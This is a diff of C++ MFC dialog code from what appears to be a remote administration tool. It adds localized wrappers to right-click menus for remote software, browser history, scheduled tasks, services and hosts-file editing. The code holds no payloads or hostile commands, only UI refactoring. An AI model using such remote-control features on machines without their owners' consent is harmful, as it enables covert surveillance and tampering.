     int nMenuResult = ::TrackPopupMenu(menu, TPM_LEFTALIGN | TPM_RIGHTBUTTON | TPM_RETURNCMD, p.x, p.y, 0, GetSafeHwnd(), NULL);
@@ -1250,7 +1250,7 @@ void CMachineDlg::ShowSoftWareList_menu()
             Data += _T("\r\n");
         }
         SetClipboardText(Data);
-        MessageBox(_T("已复制数据到剪切板!"), "提示");
+        MessageBoxL(_T("已复制数据到剪切板!"), "提示", MB_ICONINFORMATION);
     }
     break;
     case 200: {
@@ -1258,7 +1258,7 @@ void CMachineDlg::ShowSoftWareList_menu()
             return;
         }
 
-        if (MessageBox(_T("确定要卸载该程序?"), _T("提示"), MB_YESNO | MB_ICONQUESTION) == IDNO)
+        if (MessageBoxL(_T("确定要卸载该程序?"), _T("提示"), MB_YESNO | MB_ICONQUESTION) == IDNO)
             return;
 
         POSITION pos = m_list.GetFirstSelectedItemPosition();
@@ -1290,10 +1290,10 @@ void CMachineDlg::ShowIEHistoryList_menu()
 {
     CMenu menu;
     VERIFY(menu.CreatePopupMenu());
-    menu.AppendMenu(MF_STRING | MF_ENABLED, 50, _T("刷新数据(&F)"));
-    menu.AppendMenu(MF_STRING | MF_ENABLED, 100, _T("复制数据(&V)"));
+    menu.AppendMenuL(MF_STRING | MF_ENABLED, 50, _T("刷新数据(&F)"));
+    menu.AppendMenuL(MF_STRING | MF_ENABLED, 100, _T("复制数据(&V)"));
 
-    menu.AppendMenu(MF_SEPARATOR, NULL);
+    menu.AppendMenuSeparator(MF_SEPARATOR);
     CPoint	p;
     GetCursorPos(&p);
     int nMenuResult = ::TrackPopupMenu(menu, TPM_LEFTALIGN | TPM_RIGHTBUTTON | TPM_RETURNCMD, p.x, p.y, 0, GetSafeHwnd(), NULL);
@@ -1320,7 +1320,7 @@ void CMachineDlg::ShowIEHistoryList_menu()
             Data += _T("\r\n");
         }
         SetClipboardText(Data);
-        MessageBox(_T("已复制数据到剪切板!"), "提示");
+        MessageBoxL(_T("已复制数据到剪切板!"), "提示", MB_ICONINFORMATION);
     }
     break;
 
@@ -1335,11 +1335,11 @@ void CMachineDlg::ShowTaskList_menu()
 {
     CMenu menu;
     VERIFY(menu.CreatePopupMenu());
-    menu.AppendMenu(MF_STRING | MF_ENABLED, 100, _T("&(R)执行任务"));
-    menu.AppendMenu(MF_STRING | MF_ENABLED, 101, _T("&(T)停止任务"));
-    menu.AppendMenu(MF_STRING | MF_ENABLED, 102, _T("&(D)删除任务"));
-    menu.AppendMenu(MF_STRING | MF_ENABLED, 103, _T("&(C)创建任务"));
-    menu.AppendMenu(MF_STRING | MF_ENABLED, 104, _T("&(F)刷新任务"));
+    menu.AppendMenuL(MF_STRING | MF_ENABLED, 100, _T("&(R)执行任务"));
+    menu.AppendMenuL(MF_STRING | MF_ENABLED, 101, _T("&(T)停止任务"));
+    menu.AppendMenuL(MF_STRING | MF_ENABLED, 102, _T("&(D)删除任务"));
+    menu.AppendMenuL(MF_STRING | MF_ENABLED, 103, _T("&(C)创建任务"));
+    menu.AppendMenuL(MF_STRING | MF_ENABLED, 104, _T("&(F)刷新任务"));
     CPoint	p;
     GetCursorPos(&p);
     int nMenuResult = menu.TrackPopupMenu(TPM_RETURNCMD | TPM_LEFTALIGN | TPM_RIGHTBUTTON, p.x, p.y, this, NULL);
@@ -1478,10 +1478,10 @@ void CMachineDlg::ShowFavoritesUrlList_menu()
 {
     CMenu menu;
     VERIFY(menu.CreatePopupMenu());
-    menu.AppendMenu(MF_STRING | MF_ENABLED, 50, _T("刷新数据(&F)"));
-    menu.AppendMenu(MF_STRING | MF_ENABLED, 100, _T("复制数据(&V)"));
+    menu.AppendMenuL(MF_STRING | MF_ENABLED, 50, _T("刷新数据(&F)"));
+    menu.AppendMenuL(MF_STRING | MF_ENABLED, 100, _T("复制数据(&V)"));
 
-    menu.AppendMenu(MF_SEPARATOR, NULL);
+    menu.AppendMenuSeparator(MF_SEPARATOR);
     CPoint	p;
     GetCursorPos(&p);
     int nMenuResult = ::TrackPopupMenu(menu, TPM_LEFTALIGN | TPM_RIGHTBUTTON | TPM_RETURNCMD, p.x, p.y, 0, GetSafeHwnd(), NULL);
@@ -1508,7 +1508,7 @@ void CMachineDlg::ShowFavoritesUrlList_menu()
             Data += _T("\r\n");
         }
         SetClipboardText(Data);
-        MessageBox(_T("已复制数据到剪切板!"), "提示");
+        MessageBoxL(_T("已复制数据到剪切板!"), "提示", MB_ICONINFORMATION);
     }
     break;
     default:
@@ -1522,17 +1522,17 @@ void CMachineDlg::ShowServiceList_menu()
 {
     CMenu menu;
     VERIFY(menu.CreatePopupMenu());
-    menu.AppendMenu(MF_STRING | MF_ENABLED, 100, _T("启动(&S)"));
-    menu.AppendMenu(MF_STRING | MF_ENABLED, 200, _T("停止(&O)"));
-    menu.AppendMenu(MF_STRING | MF_ENABLED, 300, _T("暂停(&U)"));
-    menu.AppendMenu(MF_STRING | MF_ENABLED, 400, _T("恢复(&M)"));
-    menu.AppendMenu(MF_STRING | MF_ENABLED, 500, _T("重新启动(&E)"));
-    menu.AppendMenu(MF_SEPARATOR, NULL);
-    menu.AppendMenu(MF_STRING | MF_ENABLED, 600, _T("刷新(&R)"));
-    menu.AppendMenu(MF_SEPARATOR, NULL);
-    menu.AppendMenu(MF_STRING | MF_ENABLED, 700, _T("属性(&R)"));
-    menu.AppendMenu(MF_SEPARATOR, NULL);
-    menu.AppendMenu(MF_STRING | MF_ENABLED, 800, _T("删除服务(&D)"));
+    menu.AppendMenuL(MF_STRING | MF_ENABLED, 100, _T("启动(&S)"));
+    menu.AppendMenuL(MF_STRING | MF_ENABLED, 200, _T("停止(&O)"));
+    menu.AppendMenuL(MF_STRING | MF_ENABLED, 300, _T("暂停(&U)"));
+    menu.AppendMenuL(MF_STRING | MF_ENABLED, 400, _T("恢复(&M)"));
+    menu.AppendMenuL(MF_STRING | MF_ENABLED, 500, _T("重新启动(&E)"));
+    menu.AppendMenuSeparator(MF_SEPARATOR);
+    menu.AppendMenuL(MF_STRING | MF_ENABLED, 600, _T("刷新(&R)"));
+    menu.AppendMenuSeparator(MF_SEPARATOR);
+    menu.AppendMenuL(MF_STRING | MF_ENABLED, 700, _T("属性(&R)"));
+    menu.AppendMenuSeparator(MF_SEPARATOR);
+    menu.AppendMenuL(MF_STRING | MF_ENABLED, 800, _T("删除服务(&D)"));
     CPoint	p;
     GetCursorPos(&p);
     int nMenuResult = ::TrackPopupMenu(menu, TPM_LEFTALIGN | TPM_RIGHTBUTTON | TPM_RETURNCMD, p.x, p.y, 0, GetSafeHwnd(), NULL);
@@ -1585,11 +1585,11 @@ void CMachineDlg::ShowHostsList_menu()
 {
     CMenu menu;
     VERIFY(menu.CreatePopupMenu());
-    menu.AppendMenu(MF_STRING | MF_ENABLED, 50, _T("刷新数据(&F)"));
-    menu.AppendMenu(MF_STRING | MF_ENABLED, 100, _T("复制数据(&V)"));
-    menu.AppendMenu(MF_SEPARATOR, NULL);
-    menu.AppendMenu(MF_STRING | MF_ENABLED, 200, _T("修改远程文件(&S)"));
-    menu.AppendMenu(MF_STRING | MF_ENABLED, 300, _T("加载本地文件(&S)"));
+    menu.AppendMenuL(MF_STRING | MF_ENABLED, 50, _T("刷新数据(&F)"));
+    menu.AppendMenuL(MF_STRING | MF_ENABLED, 100, _T("复制数据(&V)"));
+    menu.AppendMenuSeparator(MF_SEPARATOR);
+    menu.AppendMenuL(MF_STRING | MF_ENABLED, 200, _T("修改远程文件(&S)"));
+    menu.AppendMenuL(MF_STRING | MF_ENABLED, 300, _T("加载本地文件(&S)"));
     CPoint	p;
     GetCursorPos(&p);
     int nMenuResult = ::TrackPopupMenu(menu, TPM_LEFTALIGN | TPM_RIGHTBUTTON | TPM_RETURNCMD, p.x, p.y, 0, GetSafeHwnd(), NULL);
@@ -1616,7 +1616,7 @@ void CMachineDlg::ShowHostsList_menu()
             Data += _T("\r\n");
         }
         SetClipboardText(Data);
-        MessageBox(_T("已复制数据到剪切板!"), "提示");
+        MessageBoxL(_T("已复制数据到剪切板!"), "提示", MB_ICONINFORMATION);
     }
     break;
     case 200: {
@@ -1643,7 +1643,7 @@ void CMachineDlg::ShowHostsList_menu()
         LPBYTE lpBuffer = NULL;
         CFileDialog dlg(TRUE, _T("*.txt"), NULL, OFN_FILEMUSTEXIST | OFN_PATHMUSTEXIST | OFN_HIDEREADONLY,
                         _T("图片文件(*.txt;*.txt)|*.txt;*.txt| All Files (*.*) |*.*||"), NULL);
-        dlg.m_ofn.lpstrTitle = _T("选择文件");
+        dlg.m_ofn.lpstrTitle = _L(_T("选择文件"));
 
         if (dlg.DoModal() != IDOK)
             break;
@@ -1691,7 +1691,7 @@ CString CMachineDlg::oleTime2Str(double time)
         time_t t = (time_t)(time * 24 * 3600 - 2209190400);
         struct tm tm1;
         localtime_s(&tm1, &t);
-        str.Format(_T("%04d-%02d-%02d %02d:%02d:%02d"), tm1.tm_year + 1900, tm1.tm_mon + 1,
+        str.FormatL(_T("%04d-%02d-%02d %02d:%02d:%02d"), tm1.tm_year + 1900, tm1.tm_mon + 1,
                    tm1.tm_mday, tm1.tm_hour, tm1.tm_min, tm1.tm_sec);
     }
     return str;
